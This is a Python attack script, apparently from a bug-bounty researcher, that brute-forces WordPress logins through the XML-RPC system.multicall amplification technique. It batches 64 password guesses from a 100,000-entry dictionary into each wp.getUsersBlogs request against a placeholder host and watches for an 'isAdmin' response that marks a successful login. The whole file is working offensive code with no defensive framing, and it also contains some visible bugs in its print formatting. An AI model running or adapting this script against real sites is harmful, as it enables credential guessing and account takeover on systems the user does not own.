#!/usr/bin/env python3
#
# XML-RPC bruteforce amplification attack
# https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/

import requests

output = open("./output.txt", "w")
passwords = open(
    "/Users/bl4de/hacking/dictionaries/100000_passwords.txt").readlines()
host = "HOST.com"

# headers used in POST requests
h = {
    "Host": host,
    "User-Agent": "HackerOne/bl4de"
}

index = 0

# XMLRPC url
url = f"https://{host}/xmlrpc.php"

print("[+] building payload...")
# building payload for system.multicall wp.getUsersBlogs
payload_start = """
<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
"""


payload_end = """
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>
"""

total = 0


def send_request_with_username(username, passwords):
    global total
    payload = ""
    username = username.strip()

    for password in passwords:
        payload = payload + """
            <value>
                <struct>
                    <member>
                        <name>methodName</name>
                        <value>
                            <string>wp.getUsersBlogs</string>
                        </value>
                    </member>
                    <member>
                        <name>params</name>
                        <value>
                            <array>
                                <data>
                                    <value>
                                        <array>
                                            <data>
                                                <value>
                                                    <string>{}</string>
                                                </value>
                                                <value>
                                                    <string>{}</string>
                                                </value>
                                            </data>
                                        </array>
                                    </value>
                                </data>
                            </array>
                        </value>
                    </member>
                </struct>
            </value>
        """.format(username, password.strip())
        total = total + 1

    print("\n[+] payload for {} ready ({} KB)...".format(username, len(payload)/64))

    payload = payload_start + payload + payload_end

    print(payload)

    print("[+] sending POST request with payload... ({} credentials in total checked)".format(total))
    resp = requests.post(url, headers=h, data=payload)

    if resp.status_code == 200:
        print("[+] response HTTP 200 OK received, analysing results...")
        # p0wned. This is the end :P
        if "isAdmin" in resp.content:
            print("[+] SUCCESS !!! Matching username/password for {} found!, please review response content for details...").format(username)
            output.write(resp.content)
            exit(0)

        else:
            print(
                "[-] no matching username/password for {} found... :(").format(username)

        output.write(resp.content)

    else:
        print("[-] something wrong, {} HTTP Response form{} received: \n\n").format(
            resp.status_code, username)
        print(resp.content)


# for username in usernames:
#   send_request_with_username("trapcall", ["123456"])

for i in range(0, 100000, 64):
    p = passwords[i:i+64]
    send_request_with_username("trapcall", p)

print("[+] done...\n\n")
